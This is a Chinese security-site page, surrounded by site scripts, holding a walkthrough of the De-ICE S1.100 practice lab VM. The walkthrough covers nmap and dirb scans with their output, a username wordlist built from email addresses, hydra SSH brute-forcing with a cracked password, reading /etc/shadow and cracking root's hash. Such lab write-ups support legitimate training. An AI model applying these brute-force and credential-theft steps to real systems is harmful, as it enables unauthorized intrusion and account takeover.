<head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> </head><script src="static/js/header/jquery.min.js?ver=3.6.1" type="text/javascript"></script>
<script src="static/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1" type="text/javascript"></script>
<script src="static/js/highslide/highslide-with-html.packed.js" type="text/javascript"></script>
<script type="text/javascript">
jQuery(document).ready(function($) {
    hs.graphicsDir = "static/buf/plugins/auto-highslide/images/graphics/";
    hs.outlineType = "rounded-white";
    hs.dimmingOpacity = 0.8;
    hs.outlineWhileAnimating = true;
    hs.showCredits = false;
    hs.captionEval = "this.thumb.alt";
    hs.numberPosition = "caption";
    hs.align = "center";
    hs.transitions = ["expand", "crossfade"];
    hs.addSlideshow({
        interval: 5000,
        repeat: true,
        useControls: true,
        fixedControls: "fit",
        overlayOptions: {
            opacity: 0.75,
            position: "bottom center",
            hideOnMouseOut: true

        }

    });
});
</script>
<script language="JavaScript" src="static/buf/plugins/cartpauj-pm/js/script.js" type="text/javascript"></script>
<script src="static/buf/themes/freebuf/js/layer.js"></script>
<script src="static/buf/plugins/simditor/highlight/highlight.pack.js" type="text/javascript"></script>
<script src="static/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
<script src="static/buf/themes/freebuf/js/bootstrap.min.js"></script>
<script src="static/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
<script src="static/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
<script src="static/js/focus/bjqs-1.3.min.js" type="text/javascript"></script>
<script src="static/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript"></script>
<script src="static/js/new/setint.js" type="text/javascript"></script>
<script src="static/js/colum/swiper-3.4.2.min.js"></script>
<script type="application/ecmascript">
    $('.icon-wechat').hover(function(){
        $('.wechatImgdiv').show()
    },function(){
        $('.wechatImgdiv').hide()
    })
</script>
<script src="static/js/header/header.js" type="text/javascript"></script>
<script>
		jQuery(window).load(function () {
			jQuery(".main-header").sticky({topSpacing: 0});
		});
	</script>
<script>
                    $('.user-detial .test-info').mouseover(function() {
                        var _title = $(this).find('.text').attr('data-title');
                        if (_title) {
                            var str = '<span class="text-title">' + _title + '</span>';
                            $(this).append(str);
                        }
                    }).mouseout(function() {
                        $('.user-detial .test-info .text-title').remove();
                    });
                </script>
<script type="text/javascript">
				jQuery("#pagination a").live("click", function () {
					var _url = jQuery(this).attr("href");
					jQuery(this).parents("li").addClass("current").blur().parents("#menupage").find("li").not(jQuery(this).parents("li")).removeClass("current");
					jQuery.ajax({
						type: "POST",
						url: _url + "#timeline",
						success: function (data) {
							result = jQuery(data).find("#timeline .news_inner");
							nextHref = jQuery(data).find("#pagination a").attr("href");
							if (nextHref != undefined) {
								jQuery("#pagination a").attr("href", nextHref);
							} else {
								jQuery("#pagination").remove();
							}
							jQuery(function () {
								if (_url.indexOf("page") < 1) {
									jQuery("#timeline").html('');
								}
								jQuery("#timeline").append(result.fadeIn(200));
							});
						}
					});
					return false;
				});
			</script>
<script>
    $('.star_score > a').click(function() {
        $(this).addClass('active');
        $(this).siblings().removeClass('active');
    });
    $('.star_score > a').hover(function() {
        $(this).siblings().removeClass('active');
    });
    $(document).on('click', function() {
        $('.bottom_tools .tips-wrap').hide(500);
    });
    $('.bottom_tools ul li.fb-tips').click(function(event) {
        var evt = event || evt;
        evt.stopPropagation();
        $(this).find('.tips-wrap').toggle(500);
    });
    $('.bottom_tools .tips-wrap').click(function(event) {
        var evt = evt || event;
        evt.stopPropagation();
        $(this).show();
    });
    $('.feedback').on('click',function () {
        var content = $('#feedback-content').val();
        if(!content){
            $('#feedback-content').focus();
            $('.feedback-error').text('反馈内容不能为空！').show();
            return;
        }
        var contact = $('#feedback-contact').val();
        if(!contact){
            $('#feedback-contact').focus();
            $('.feedback-error').text('联系方式不能为空！').show();
            return;
        }
        var score = $('.star_score').children('.active').attr('data-id')
        if(!score){
            $('.feedback-error').text('给FreeBuf打个分吧！').show();
            return;
        }
        var yzm = $('#yzm').val();
        var _url = 'static/verify';
        $.ajax({
            type: "post",
            url: _url,
            data: {'content':content,'contact':contact,'score':score,'feedback_status':1,'yzm':yzm},
            success: function (data) {
                $("#captcha").trigger('click')
                if(data.code ==200){
                    layer.open({
                        title: '系统提示',
                        btnAlign: 'c',
                        content: data.msg,
                        area: '278px',
                    });
                }else {
                    layer.open({
                        title: '系统提示',
                        btnAlign: 'c',
                        content: data.msg,
                        area: '278px',
                    });
                }
            },
        })
    })

    $(document).on('click', '.appeal-wrap-public .appeal-main', function(event) {
        var evt = event || evt;
        evt.stopPropagation();
        $('.appeal-wrap-public').show();
    });
    $(document).on('click', '.appeal-main .close', function(event) {
        var evt = event || evt;
        evt.stopPropagation();
        $('.appeal-wrap').hide();
    });
    $(document).on('click', '.appeal-main .appeal-footer .btn-sure', function(event) {
        var evt = event || evt;
        evt.stopPropagation();
        $('.appeal-wrap-public').hide();
    });

    $('.complain').on('click',function () {
        var _url = 'static/verify';
        var token = $('#complain_token').val();
        $.ajax({
            type: "post",
            url: _url,
            data: {'complain_token':token,'complain_status':1},
            success: function (data) {
            },
        })
    })
</script>
<script src="static/js/new/backtop.js"></script>
<script type="text/javascript">
jQuery(function(){	
	jQuery('.tabPanes ul li').click(function(){
		jQuery(this).addClass('hit').siblings().removeClass('hit');
		jQuery('.panesl>div:eq('+jQuery(this).index()+')').show().siblings().hide();	
	})
	jQuery('.vulbox-nav').click(function(e) { 
        e.stopPropagation(); 
    });  
})
</script>
<script type="text/javascript">
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fcc53db168808048541c6735ce30421f5' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
jQuery(function() {
    jQuery(".simditor pre").each(function(i, block){
        hljs.highlightBlock(block);    
    });
    hljs.initHighlightingOnLoad();
});
</script>
<script>
/* <![CDATA[ */
var rcGlobal = {
	serverUrl		:'static',
	infoTemp		:'%REVIEWER% on %POST%',
	loadingText		:'Loading',
	noCommentsText	:'No comments',
	newestText		:'&laquo; 最新',
	newerText		:'&laquo; 新一点',
	olderText		:'旧一点 &raquo;',
	showContent		:'1',
	external		:'1',
	avatarSize		:'32',
	avatarPosition	:'left',
	anonymous		:'Anonymous'
};
/* ]]> */
</script>
<script src="static/js/recentcomments/wp-recentcomments-jquery.js?ver=2.2.3" type="text/javascript"></script>

<link href="static/buf/plugins/wp-favorite-posts/wpfp.css" id="wpfp-css" rel="stylesheet" type="text/css"/>
<link href="static/css/recentcomments/wp-recentcomments.css?ver=2.2.3" id="wp-recentcomments-css" media="screen" rel="stylesheet" type="text/css"/>
<link href="static/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1" id="mycred-widget-css" media="all" rel="stylesheet" type="text/css"/>
<link href="static/css/highslide/highslide.css" rel="stylesheet" type="text/css"/>
<link href="static/buf/plugins/cartpauj-pm/style/style.css" rel="stylesheet" type="text/css"/>
<link href=" static/buf/plugins/simditor/highlight/styles/default.css" rel="stylesheet" type="text/css"/>
<link href="https://static.freebuf.com/images/favicon.ico" rel="shortcut icon"/>
<link href="static/css/new/header.css" rel="stylesheet"/>
<link href="static/css/new/bootstrap.min.css?ver=2016051701" media="screen" rel="stylesheet"/>
<link href="static/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css"/>
<link href="static/css/new/style.css?ver=2018112123749359438534" rel="stylesheet" type="text/css"/>

<div id="contenttxt">
                            <h2>下载地址<br /></h2>
<p><a href="http://21ltr.com/scenes/21LTR.com_Scene1_2.120_v1.0.iso"></a></p>
<pre>http://hackingdojo.com/downloads/iso/De-ICE_S1.100.iso<br /></pre>
<h2>任务信息</h2>
<pre>Encrypted salary file Broken FTP service</pre>
<h2>实战演练</h2>
<p>新建一个虚拟机，类型选择其他，其他，其余都是下一步下一步，然后导入镜像就可以启动</p>
<pre>它设置了静态IP192.168.1.100，所以kali也要设置到同一个网段</pre>
<h3>信息收集</h3>
</p>
<pre>root@kali:~# nmap -sV -p1-65535 192.168.1.100

Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-26 06:47 EST

mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers

Nmap scan report for 192.168.1.100

Host is up (0.00024s latency).

Not shown: 65527 filtered ports

PORT    STATE  SERVICE  VERSION

20/tcp  closed ftp-data

21/tcp  open   ftp      vsftpd (broken: could not bind listening IPv4 socket)

22/tcp  open   ssh      OpenSSH 4.3 (protocol 1.99)

25/tcp  open   smtp     Sendmail 8.13.7/8.13.7

80/tcp  open   http     Apache httpd 2.0.55 ((Unix) PHP/5.1.2)

110/tcp open   pop3     Openwall popa3d

143/tcp open   imap     UW imapd 2004.357

443/tcp closed https

MAC Address: 00:0C:29:E0:C2:37 (VMware)

Service Info: Host: slax.example.net; OS: Unix<br /></pre>
<p></p>
<p>扫描目录</p>
<pre>root@kali:~# dirb http://192.168.1.100

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Feb 26 07:04:32 2019
URL_BASE: http://192.168.1.100/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.100/ ----
+ http://192.168.1.100/~ftp (CODE:403|SIZE:412)                                                                                                                                                                   
+ http://192.168.1.100/cgi-bin/ (CODE:403|SIZE:297)                                                                                                                                                               
+ http://192.168.1.100/index.php (CODE:200|SIZE:1983)                                                                                                                                                             
+ http://192.168.1.100/info.php (CODE:200|SIZE:37924)                                                                                                                                                             
                                                                                                                                                                                                                  
-----------------
END_TIME: Tue Feb 26 07:04:34 2019
DOWNLOADED: 4612 - FOUND: 4
</pre>
<p>使用sparta进行扫描探测</p>
<p><img alt="image.png" data-original="images/20190226/1551182433_5c752a61bf865.png" src="images/20190226/1551182433_5c752a61bf865.png" width="690" height="454" /></p>
<noscript><img alt="image.png" src="images/20190226/1551182433_5c752a61bf865.png" width="690" height="454" /></p></noscript>
<p><img alt="image.png" data-original="images/20190226/1551183772_5c752f9c971c3.png" src="images/20190226/1551183772_5c752f9c971c3.png" width="690" height="154" /></p>
<noscript><img alt="image.png" src="images/20190226/1551183772_5c752f9c971c3.png" width="690" height="154" /></p></noscript>
<p><b>提示</b></p>
<pre>SPOILER
Are you stuck? I have included the tools needed, and the order to use them, below. I have hidden them by matching the text color to the background.(Highlight white-space below each section to find the "hidden" answers.)

TOOLS REQUIRED (in order of use):
nmap
Firefox
ssh
hydra
john (the ripper)
openssl

OTHER HINTS
- Interns tend to know nothing of security
- The ftp server is broken; it's supposed to be
- Even though the ftp server is broken, there may be residual files of interest; read the /etc/passwd file first, though
- If you get the CEO's bank account information, you've defeated this challenge. Congratulations </pre>
<p>看来按照提示和看了一下扫描出来的东西，只能爆破用户和密码</p>
<p>根据查看页面的源代码找到用户的邮箱</p>
<pre>marym@herot.net 
patrickp@herot.net
thompsont@herot.net
benedictb@herot.net
genniege@herot.net
michaelp@herot.net
longe@herot.net
adamsa@herot.net
banterb@herot.net
coffeec@herot.net</pre>
<p>做成用户字典</p>
<pre>webmaster
postmaster 
admin
administrator
guest
root 
marym
mmary
mary 
patrickp
ppatrick
patrick
thompsont
tthompson
thompson
benedictb
bbenedict
benedict 
genniege
egennieg
gennieg
michaelp
pmichael
michael
longe
elong
long
adamsa
aadams
adams
banterb
bbanter
banter
coffeec
ccoffee
coffee</pre>
<p>使用hydra进行爆破</p>
<p><img alt="image.png" data-original="images/20190226/1551185978_5c75383a05b5a.png" src="images/20190226/1551185978_5c75383a05b5a.png" width="690" height="141" />使用bbanter登录</p>
<noscript><img alt="image.png" src="images/20190226/1551185978_5c75383a05b5a.png" width="690" height="141" />使用bbanter登录</p></noscript>
<pre>看到passwd和group猜测aadams的权限比较大，于是爆破这个账号，爆破时间有点久。。。</pre>
</p>
<pre>[22][ssh] host: 192.168.1.100   login: aadams   password: nostradamus
</pre>
<p><img alt="image.png" data-original="images/20190226/1551191653_5c754e65d6085.png" src="images/20190226/1551191653_5c754e65d6085.png" width="690" height="142" />sodo输入密码再输入<span style="color:rgb(51,51,51);">nostradamus</span></p>
<noscript><img alt="image.png" src="images/20190226/1551191653_5c754e65d6085.png" width="690" height="142" />sodo输入密码再输入<span style="color:rgb(51,51,51);">nostradamus</span></p></noscript>
<p><span style="color:rgb(51,51,51);"><img alt="image.png" data-original="images/20190226/1551191919_5c754f6f587fd.png" src="images/20190226/1551191919_5c754f6f587fd.png" width="690" height="394" /><br /></span></p>
<noscript><img alt="image.png" src="images/20190226/1551191919_5c754f6f587fd.png" width="690" height="394" /><br /></span></p></noscript>
<p>查看shadow文件</p>
<p><img alt="image.png" data-original="images/20190226/1551191951_5c754f8f9e99f.png" src="images/20190226/1551191951_5c754f8f9e99f.png" width="605" height="483" />接下来就彩虹表爆破明文密码</p>
<noscript><img alt="image.png" src="images/20190226/1551191951_5c754f8f9e99f.png" width="605" height="483" />接下来就彩虹表爆破明文密码</p></noscript>
<p><img alt="image.png" src="images/20190226/1551192430_5c75516e47c41.png" width="690" height="341" /><img alt="image.png" data-original="images/20190226/1551192870_5c75532637d57.png" src="images/20190226/1551192870_5c75532637d57.png" width="690" height="195" />找到了root的密码，用root登录，发现被限制了，那就只能通过aadams账号进行su到root</p>
<noscript><img alt="image.png" src="images/20190226/1551192430_5c75516e47c41.png" width="690" height="341" /><img alt="image.png" src="images/20190226/1551192870_5c75532637d57.png" width="690" height="195" />找到了root的密码，用root登录，发现被限制了，那就只能通过aadams账号进行su到root</p></noscript>
<p><img alt="image.png" data-original="images/20190226/1551193160_5c7554482178b.png" src="images/20190226/1551193160_5c7554482178b.png" width="690" height="211" />nc传输加密文件</p>
<noscript><img alt="image.png" src="images/20190226/1551193160_5c7554482178b.png" width="690" height="211" />nc传输加密文件</p></noscript>
<p><img alt="image.png" src="images/20190226/1551193446_5c755566ba2af.png" width="597" height="96" /><img alt="image.png" data-original="images/20190226/1551193467_5c75557b5507b.png" src="images/20190226/1551193467_5c75557b5507b.png" width="690" height="135" />分析加密文件</p>
<noscript><img alt="image.png" src="images/20190226/1551193446_5c755566ba2af.png" width="597" height="96" /><img alt="image.png" src="images/20190226/1551193467_5c75557b5507b.png" width="690" height="135" />分析加密文件</p></noscript>
<p><img alt="image.png" data-original="images/20190226/1551193542_5c7555c64a708.png" src="images/20190226/1551193542_5c7555c64a708.png" width="575" height="220" /></p>
<noscript><img alt="image.png" src="images/20190226/1551193542_5c7555c64a708.png" width="575" height="220" /></p></noscript>
<p>原本打算在kali本机解密这个文件，发现加密不了，后来就干脆在靶机上面直接加密</p>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190227/1551231690_5c75eacad1c97.png" src="images/20190227/1551231690_5c75eacad1c97.png" width="690" height="208" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190227/1551231690_5c75eacad1c97.png" width="690" height="208" /></p></noscript>
                                
                                <div class="column-support">
                                    <p class="support-mount good_num"></p>
                                    <a href="javascript:void (0);" data-status="0" data-id="196777" class="good"></a>
                                </div>
                                <script>
                                    $('.good').on('click',function () {
                                        var login = $(this).attr('data-status');
                                        if(login){
                                            var token = $('#token').val();
                                            var id = $(this).attr('data-id');
                                            var good = $('.good_num').text();
                                            var _this = $(this);
                                            var _url = document.location.href;
                                            $.ajax({
                                                type: "post",
                                                url: _url,
                                                data: {'token':token,'id':id, 'good':1},
                                                success: function (data) {
                                                    $('#token').val(data.token);
                                                    if(data.code ==400){
                                                        layer.open({
                                                            title: '系统提示',
                                                            btnAlign: 'c',
                                                            content: data.msg,
                                                            area: '278px',
                                                        });
                                                    }else {
                                                        if(good){
                                                            good++;
                                                        }else {
                                                            good=1;
                                                        }
                                                        $('.good_num').text(good);
                                                        _this.disabled();
                                                    }
                                                },
                                            })
                                        }else {
                                            layer.open({
                                                title: '系统提示',
                                                btnAlign: 'c',
                                                content: '请先登录',
                                                btn: ['登录'],
                                                area: '278px',
                                                yes: function () {
                                                    login();
                                                },
                                            });
                                        }
                                        return false;
                                    })
                                    function login(){
                                        window.location.href = 'https//www.freebuf.com/oauth';
                                    }
                                </script>
                                                    </div>
                        <div class="wechatcodeDiv">